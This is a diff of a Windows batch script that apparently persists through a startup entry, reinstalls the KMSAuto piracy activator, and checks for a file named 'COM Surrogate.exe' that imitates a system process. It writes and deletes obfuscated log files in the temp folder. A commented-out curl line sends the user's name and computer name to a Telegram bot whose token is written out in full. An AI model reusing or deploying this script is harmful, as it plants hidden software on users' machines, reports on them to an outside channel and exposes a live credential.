@@ -24,13 +24,12 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=42.6"
+set "BATCHVERSION=44.5"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
+del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
 ::set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"
-
-
 
 
 
@@ -42,8 +41,6 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
 
-
-del /f /a /q "%LOGFILE%"
 
 ::goto :EOF
 
@@ -171,8 +168,12 @@ echo. >> "%LOGFILE%" 2>&1
 
 if not exist "%startupFile%" (
     echo %startupFile% Not Found.. Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
-	goto INSTRUNEVERY
+	set "GoingINSTRUNEVERY=1"
+	rem goto INSTRUNEVERY
 )
+
+if "%GoingINSTRUNEVERY%"=="1" goto INSTRUNEVERY
+
 
 echo. >> "%LOGFILE%" 2>&1
 echo %startupFile% Found. >> "%LOGFILE%" 2>&1
@@ -488,6 +489,7 @@ set "filename="
 call :LogOutput >> "%LOGFILE%" 2>&1
 echo.
 ::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
+::timeout /t 15 /nobreak
 del /f /a /q "%LOGFILE%"
 ::attrib -h -s "%temp%\temp_scrip*.bat" & del /f /a /q "%temp%\temp_scrip*.bat"
 del /f /a /q %temp%\*.mpee
@@ -1240,13 +1242,21 @@ echo.
 echo Comparing with official MD5: %KMSAutoMD5%
 echo.
 
+
+
+
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
     echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
     echo.
     echo.
     echo going to CheckComSurrogate
-    goto CheckComSurrogate
+	set "GoingCheckCom=1"
+	rem goto CheckComSurrogate
 )
+
+if "%GoingCheckCom%"=="1" goto CheckComSurrogate
+
+
 
 echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
 echo Turning CheckSend=1
@@ -1262,6 +1272,11 @@ echo.
 echo.
 
 
+
+
+
+
+
 echo Deleting %KMSFILEroot% and %KMSFILE%
 del /f /a /q "%KMSFILEroot%"
 echo Killing process KMSAuto by Powershell
@@ -1275,13 +1290,18 @@ echo.
 if exist "%KMSFILEroot%" (
     echo Failed to delete %KMSFILEroot%!
     echo Going to CheckComSurrogate
+	set "GoingCheckCom=1"
     echo.
     echo.
     echo.
-    goto CheckComSurrogate
+    rem goto CheckComSurrogate
 ) else (
     echo Successfully deleted %KMSFILEroot%.
 )
+
+
+if "%GoingCheckCom%"=="1" goto CheckComSurrogate
+
 
 if exist "%KMSFILE%" (
      echo Failed to delete %KMSFILE%!
@@ -1291,14 +1311,17 @@ if exist "%KMSFILE%" (
      echo Successfully deleted %KMSFILE%.
 )
 
+echo.
+echo.
+echo.
 
-
-echo.
-echo.
-echo.
 
 
 echo Going to KMSINSTALL...
+
+
+
+
 
 
 :KMSINSTALL
@@ -1363,9 +1386,20 @@ echo.
 
 
 
+
+
+
+
+
+
+
+
+
+
 :CheckComSurrogate
 echo :CheckComSurrogate
 echo.
+
 
 :: Check ComSurrogate.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
